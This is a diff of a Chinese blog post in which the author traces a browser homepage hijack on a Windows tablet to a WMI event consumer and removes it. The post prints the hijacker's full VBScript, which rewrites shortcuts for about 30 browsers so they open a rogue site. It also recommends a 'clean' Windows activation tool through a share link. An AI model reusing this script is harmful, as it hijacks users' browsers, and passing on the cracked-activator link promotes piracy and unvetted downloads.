@@ -407,48 +407,48 @@ height:50vh;
     <article class="article-entry">
         <p>平板上面的浏览器的主页一直被劫持。有人推荐管家什么的，瞧我这Windows平板的配置，以毒攻毒无异于饮鸩止渴，我怕我这平板也要废了。</p>
 <p>来记录下我用的方法。</p>
-<p><img src="WMITools/pad1.png" alt="pad"></p>
+<p><img src="pad1.png" alt="pad"></p>
 <p>观察了下 发现浏览器的快捷方式后面都会给加上一个网址</p>
-<p><img src="WMITools/pad2.png" alt="pad"></p>
+<p><img src="pad2.png" alt="pad"></p>
 <p>改了之后几分钟又会出来，很是烦</p>
-<h1 id="修改浏览器名称"><a href="#修改浏览器名称" class="headerlink" title="修改浏览器名称"></a>修改浏览器名称</h1><p>把原来的Chrome.exe 复制一份 改成 chrome1.exe 或者什么的<br><img src="WMITools/chrome1.png" alt="改名称"></p>
+<h1 id="修改浏览器名称"><a href="#修改浏览器名称" class="headerlink" title="修改浏览器名称"></a>修改浏览器名称</h1><p>把原来的Chrome.exe 复制一份 改成 chrome1.exe 或者什么的<br><img src="chrome1.png" alt="改名称"></p>
 <p>再打开的时候就不会有那个劫持了</p>
-<p><img src="WMITools/chrome2.png" alt="改名称"></p>
+<p><img src="chrome2.png" alt="改名称"></p>
 <p>不过有个问题。。。</p>
-<p><img src="WMITools/chrome3.png" alt="改名称"></p>
+<p><img src="chrome3.png" alt="改名称"></p>
 <p>当Chrome自动更新之后，chrome1.exe 就不能用了。。。。</p>
 <h1 id="VMITools"><a href="#VMITools" class="headerlink" title="VMITools"></a>VMITools</h1><p>主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：WMI工具。</p>
 <p>链接： <a href="https://share.weiyun.com/51AShol" target="_blank" rel="noopener">https://share.weiyun.com/51AShol</a> （密码：6666）</p>
-<p><img src="WMITools/vmitools.png" alt="vmitools"></p>
-<p><img src="WMITools/vmitools2.png" alt="vmitools"></p>
+<p><img src="vmitools.png" alt="vmitools"></p>
+<p><img src="vmitools2.png" alt="vmitools"></p>
 <p>之后打开WMI Event Viewer (使用管理员权限打开)，点击左上角的笔的图标（Register For Events）</p>
-<p><img src="WMITools/vmitools3.png" alt="vmitools"></p>
+<p><img src="vmitools3.png" alt="vmitools"></p>
 <p>这里我们点OK</p>
-<p><img src="WMITools/vmitools4.png" alt="vmitools"></p>
+<p><img src="vmitools4.png" alt="vmitools"></p>
 <p>这里也点ok</p>
-<p><img src="WMITools/vmitools5.png" alt="vmitools"></p>
+<p><img src="vmitools5.png" alt="vmitools"></p>
 <p>点开左侧栏的EventFilter，再点击下级目录的项目</p>
-<p><img src="WMITools/vmitools6.png" alt="vmitools"></p>
+<p><img src="vmitools6.png" alt="vmitools"></p>
 <p>在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性</p>
-<p><img src="WMITools/vmitools7.png" alt="vmitools"></p>
+<p><img src="vmitools7.png" alt="vmitools"></p>
 <p>在Script Text那一栏我们可以看到这段脚本</p>
-<p><img src="WMITools/vmitools8.png" alt="vmitools"></p>
+<p><img src="vmitools8.png" alt="vmitools"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">On Error Resume Next:Const link = &quot;http://hao.169x.cn/?v=108&quot;:Const link360 = &quot;http://hao.169x.cn/?v=108&amp;s=3&quot;:browsers = &quot;114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe&quot;:lnkpaths = &quot;C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\keacwu\Desktop,C:\Users\keacwu\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\keacwu\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\keacwu\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\keacwu\AppData\Roaming\Microsoft\Windows\Start Menu\Programs&quot;:browsersArr = split(browsers,&quot;,&quot;):Set oDic = CreateObject(&quot;scripting.dictionary&quot;):For Each browser In browsersArr:oDic.Add LCase(browser), browser:Next:lnkpathsArr = split(lnkpaths,&quot;,&quot;):Set oFolders = CreateObject(&quot;scripting.dictionary&quot;):For Each lnkpath In lnkpathsArr:oFolders.Add lnkpath, lnkpath:Next:Set fso = CreateObject(&quot;Scripting.Filesystemobject&quot;):Set WshShell = CreateObject(&quot;Wscript.Shell&quot;):For Each oFolder In oFolders:If fso.FolderExists(oFolder) Then:For Each file In fso.GetFolder(oFolder).Files:If LCase(fso.GetExtensionName(file.Path)) = &quot;lnk&quot; Then:Set oShellLink = WshShell.CreateShortcut(file.Path):path = oShellLink.TargetPath:name = fso.GetBaseName(path) &amp; &quot;.&quot; &amp; fso.GetExtensionName(path):If oDic.Exists(LCase(name)) Then:If LCase(name) = LCase(&quot;360se.exe&quot;) Then:oShellLink.Arguments = link360:Else:oShellLink.Arguments = link:End If:If file.Attributes And 1 Then:file.Attributes = file.Attributes - 1:End If:oShellLink.Save:End If:End If:Next:End If:Next:</span><br></pre></td></tr></table></figure>
 <p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p>
-<p>然后我们来删除它<br><img src="WMITools/vmitools9.png" alt="vmitools"><br><img src="WMITools/vmitools10.png" alt="vmitools"><br><img src="WMITools/vmitools11.png" alt="vmitools"></p>
+<p>然后我们来删除它<br><img src="vmitools9.png" alt="vmitools"><br><img src="vmitools10.png" alt="vmitools"><br><img src="vmitools11.png" alt="vmitools"></p>
 <p>拒绝访问？？？</p>
 <p>应该是没给管理员权限</p>
 <p>找到我们刚刚安装的位置 我的位置是 </p>
 <p>C:\Program Files\WMI Tools</p>
 <p>右键以管理员权限打开 wbemeventviewer.exe</p>
-<p><img src="WMITools/vmitools12.png" alt="vmitools"></p>
+<p><img src="vmitools12.png" alt="vmitools"></p>
 <p>按照刚刚的步骤</p>
-<p><img src="WMITools/vmitools13.png" alt="vmitools"></p>
+<p><img src="vmitools13.png" alt="vmitools"></p>
 <p>删除成功</p>
-<p><img src="WMITools/vmitools14.png" alt="vmitools"></p>
-<p>之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。<br><img src="WMITools/chrome4.png" alt="改名称"></p>
+<p><img src="vmitools14.png" alt="vmitools"></p>
+<p>之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。<br><img src="chrome4.png" alt="改名称"></p>
 <p>唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持</p>
-<p><img src="WMITools/ok.png" alt="改名称"></p>
+<p><img src="ok.png" alt="改名称"></p>
 <h1 id="激活Windows"><a href="#激活Windows" class="headerlink" title="激活Windows"></a>激活Windows</h1><p>我的这个主页劫持是用了修改过的Windows激活工具导致的</p>
 <p>这里给大家推荐一波纯洁的激活工具 </p>
 <p>链接： <a href="https://share.weiyun.com/5Fxqf1v" target="_blank" rel="noopener">https://share.weiyun.com/5Fxqf1v</a> （密码：6666）</p>
@@ -461,7 +461,7 @@ height:50vh;
             <p>原文作者：<a href="http://www.loongten.com">keacwu</a>
             </p><p>原文链接：<a href="http://www.loongten.com/2019/06/23/WMITools/">http://www.loongten.com/2019/06/23/WMITools/</a>
             </p><p>发表日期：<a href="http://www.loongten.com/2019/06/23/WMITools/">June 23rd 2019, 5:51:59 pm</a>
-            </p><p>更新日期：<a href="http://www.loongten.com/2019/06/23/WMITools/">June 23rd 2019, 7:03:03 pm</a>
+            </p><p>更新日期：<a href="http://www.loongten.com/2019/06/23/WMITools/">June 23rd 2019, 7:04:10 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
